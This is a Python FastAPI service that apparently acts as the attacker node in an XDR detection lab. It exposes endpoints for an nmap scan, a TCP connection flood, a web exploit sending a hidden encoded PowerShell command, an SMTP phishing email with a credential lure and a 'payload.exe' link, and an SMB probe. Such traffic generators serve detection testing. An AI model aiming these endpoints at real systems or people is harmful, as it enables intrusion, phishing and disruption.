import os
import subprocess
import socket
import smtplib
import time
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

app = FastAPI(title="XDR Attacker Controller", version="1.0.0")

class ScanRequest(BaseModel):
    target_ip: str
    ports: str = "80,445,25,5432"

class FloodRequest(BaseModel):
    target_ip: str
    target_port: int = 80
    count: int = 60
    delay: float = 0.01

class WebExploitRequest(BaseModel):
    target_ip: str
    cmd: str = "cmd.exe /c powershell.exe -w hidden -enc JABzAD0ATgBl..."

class PhishingRequest(BaseModel):
    target_ip: str
    target_port: int = 25
    recipient: str = "admin@corp-mail.local"
    sender: str = "alert@secure-service-update.com"
    subject: str = "URGENT: Password verification required"
    body: str = "Please verify your account credentials: http://secure-login-verify-account-update.com/login.php\nDownload patch: http://malicious-cdn.net/payload.exe"

class LateralRequest(BaseModel):
    target_ip: str
    target_port: int = 445

@app.get("/health")
def health():
    return {
        "status": "ok",
        "device": "attacker",
        "hostname": socket.gethostname()
    }

@app.post("/traffic/benign-request")
def benign_request(target_url: str = "http://172.16.0.10/"):
    """Emite una petición web benigna y autorizada desde el segmento WAN hacia la DMZ."""
    try:
        t0 = time.time()
        res = requests.get(target_url, timeout=5.0)
        return {"status": "success", "target": target_url, "http_status": res.status_code, "duration_s": round(time.time() - t0, 3)}
    except Exception as e:
        return {"status": "error", "target": target_url, "error": str(e)}

@app.post("/attack/scan")
def run_scan(req: ScanRequest):
    """Ejecuta escaneo TCP SYN mediante nmap o socket fallback."""
    cmd = ["nmap", "-sS", "-Pn", "-p", req.ports, req.target_ip]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {
            "status": "success",
            "type": "port_scan",
            "target": req.target_ip,
            "stdout": res.stdout,
            "stderr": res.stderr
        }
    except Exception as e:
        # Fallback a sockets nativos si nmap no tiene permisos NET_RAW en modo unitario
        open_ports = []
        for port_str in req.ports.split(","):
            try:
                p = int(port_str.strip())
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                if s.connect_ex((req.target_ip, p)) == 0:
                    open_ports.append(p)
                s.close()
            except Exception:
                pass
        return {
            "status": "completed_fallback",
            "type": "socket_scan",
            "target": req.target_ip,
            "open_ports": open_ports,
            "details": str(e)
        }

@app.post("/attack/flood")
def run_flood(req: FloodRequest):
    """Genera ráfagas de paquetes TCP hacia el objetivo."""
    sent = 0
    errors = 0
    for i in range(req.count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect_ex((req.target_ip, req.target_port))
            s.close()
            sent += 1
            if req.delay > 0:
                time.sleep(req.delay)
        except Exception:
            errors += 1
    return {
        "status": "success",
        "type": "tcp_flood",
        "target": f"{req.target_ip}:{req.target_port}",
        "packets_sent": sent,
        "errors": errors
    }

@app.post("/attack/web-exploit")
def run_web_exploit(req: WebExploitRequest):
    """Dispara un exploit web contra el servidor DMZ."""
    target_url = f"http://{req.target_ip}/api/vulnerable-exec"
    try:
        res = requests.post(target_url, json={"cmd": req.cmd}, timeout=10.0)
        return {
            "status": "success",
            "type": "web_exploit",
            "target": target_url,
            "http_status": res.status_code,
            "response": res.json() if res.headers.get("content-type") == "application/json" else res.text
        }
    except Exception as e:
        return {
            "status": "error",
            "type": "web_exploit",
            "target": target_url,
            "error": str(e)
        }

@app.post("/attack/send-phishing")
def send_phishing(req: PhishingRequest):
    """Transmite un correo de phishing real mediante SMTP al puerto 25."""
    try:
        msg = MIMEMultipart()
        msg["From"] = req.sender
        msg["To"] = req.recipient
        msg["Subject"] = req.subject
        msg.attach(MIMEText(req.body, "plain"))

        with smtplib.SMTP(req.target_ip, req.target_port, timeout=10.0) as server:
            server.sendmail(req.sender, [req.recipient], msg.as_string())

        return {
            "status": "success",
            "type": "smtp_phishing",
            "target": f"{req.target_ip}:{req.target_port}",
            "subject": req.subject
        }
    except Exception as e:
        return {
            "status": "error",
            "type": "smtp_phishing",
            "target": f"{req.target_ip}:{req.target_port}",
            "error": str(e)
        }

@app.post("/attack/lateral-smb")
def run_lateral_smb(req: LateralRequest):
    """Inicia tráfico SMB/TCP al puerto 445."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        conn_res = s.connect_ex((req.target_ip, req.target_port))
        # Enviar bytes simulados de SMB Negotiate Protocol Request
        if conn_res == 0:
            smb_dummy = b"\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
            s.sendall(smb_dummy)
        s.close()
        return {
            "status": "success",
            "type": "lateral_smb",
            "target": f"{req.target_ip}:{req.target_port}",
            "connection_result": "connected" if conn_res == 0 else f"code_{conn_res}"
        }
    except Exception as e:
        return {
            "status": "error",
            "type": "lateral_smb",
            "target": f"{req.target_ip}:{req.target_port}",
            "error": str(e)
        }
